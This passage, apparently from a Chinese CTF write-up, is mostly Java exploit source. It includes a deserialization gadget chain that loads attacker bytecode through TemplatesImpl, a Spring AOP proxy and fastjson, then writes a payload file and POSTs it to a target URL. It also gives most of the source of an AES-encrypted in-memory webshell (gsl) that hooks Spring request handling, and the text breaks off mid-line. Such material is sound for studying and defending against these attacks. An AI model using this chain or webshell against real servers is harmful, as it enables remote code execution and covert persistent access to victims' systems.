<span class="title function_">writeArrayTable</span><span class="params">(ObjectOutputStream s, ArrayTable table)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (table != <span class="literal">null</span> &amp;&amp; table.getKeys((Object[])<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">validCount</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            s.writeInt(<span class="number">3</span>);</span><br><span class="line">            s.writeObject(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            s.writeObject(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            s.writeObject(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">            s.writeObject(table.get(<span class="string">&quot;key1&quot;</span>));</span><br><span class="line">            s.writeObject(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">            s.writeObject(table.get(<span class="string">&quot;key2&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s.writeInt(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™ä¸ªæ–¹æ³•æˆ‘æ²¡æ‰“æˆåŠŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.SwingPropertyChangeSupport;</span><br><span class="line"><span class="keyword">import</span> javax.swing.text.StyledEditorKit;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java\\bypassjava\\META-INF\\maven\\com.example\\bypassJava\\target\\classes\\gsl.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1llustrious&quot;</span>);</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        POJONode jsonNodes2 = new POJONode(templatesImpl);</span></span><br><span class="line"><span class="comment">//        BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);</span></span><br><span class="line"><span class="comment">//        Field val2 = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);</span></span><br><span class="line"><span class="comment">//        val2.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        val2.set(exp2,jsonNodes2);</span></span><br><span class="line"><span class="comment">//        KeyPairGenerator keyPairGenerator;</span></span><br><span class="line"><span class="comment">//        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        keyPairGenerator.initialize(1024);</span></span><br><span class="line"><span class="comment">//        KeyPair keyPair = keyPairGenerator.genKeyPair();</span></span><br><span class="line"><span class="comment">//        PrivateKey privateKey = keyPair.getPrivate();</span></span><br><span class="line"><span class="comment">//        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);</span></span><br><span class="line"><span class="comment">//        POJONode jsonNodes = new POJONode(signedObject);</span></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(proxyObj);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="type">SwingPropertyChangeSupport</span> <span class="variable">swingPropertyChangeSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingPropertyChangeSupport</span>(<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        StyledEditorKit.<span class="type">AlignmentAction</span> <span class="variable">alignmentAction</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StyledEditorKit</span>.AlignmentAction(<span class="string">&quot;111&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.swing.AbstractAction&quot;</span>).getDeclaredField(<span class="string">&quot;changeSupport&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(alignmentAction,swingPropertyChangeSupport);</span><br><span class="line">        alignmentAction.putValue(<span class="string">&quot;key1&quot;</span>,xString);</span><br><span class="line">        alignmentAction.putValue(<span class="string">&quot;key2&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line"><span class="comment">//        objectOutputStream.writeUTF(&quot;NEEPU&quot;);</span></span><br><span class="line"><span class="comment">//        objectOutputStream.writeInt(1949);</span></span><br><span class="line">        objectOutputStream.writeObject(alignmentAction);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            unserialize(&quot;1.ser&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="comment">//            throw new RuntimeException(e);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//System.out.println(serial(exp));</span></span><br><span class="line">        <span class="comment">//deserial(serial(map));</span></span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line"><span class="comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;);</span></span><br><span class="line">        <span class="comment">//System.out.println(serial(exp));</span></span><br><span class="line">        <span class="comment">//deserial(serial(map));</span></span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line"><span class="comment">//        byte[] byt=new byte[fileInputStream.available()];</span></span><br><span class="line"><span class="comment">//        fileInputStream.read(byt);</span></span><br><span class="line"><span class="comment">//        doPOST(byt);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HttpHeaders</span> <span class="variable">requestHeaders</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">        requestHeaders.set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;);</span></span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://localhost:8090/nomap&quot;</span>);</span><br><span class="line">        <span class="comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span></span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);</span><br><span class="line"></span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å†…å­˜é©¬"><span id="å†…å­˜é©¬"> å†…å­˜é©¬</span></h2><p>ç½‘ä¸Šæœ‰å¾ˆå¤šå†…å­˜é©¬çš„å†™æ³•,ä¸è¿‡æˆ‘æ•´ä¸ªæœ‰æ„æ€çš„.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">gsl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String  pass=<span class="string">&quot;pass&quot;</span>,md5;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest m;</span><br><span class="line">            m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (Class) method.invoke(urlClassLoader, classbytes, <span class="number">0</span>, classbytes.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class base64;</span><br><span class="line">        <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">                value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            md5 = md5(pass + xc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span 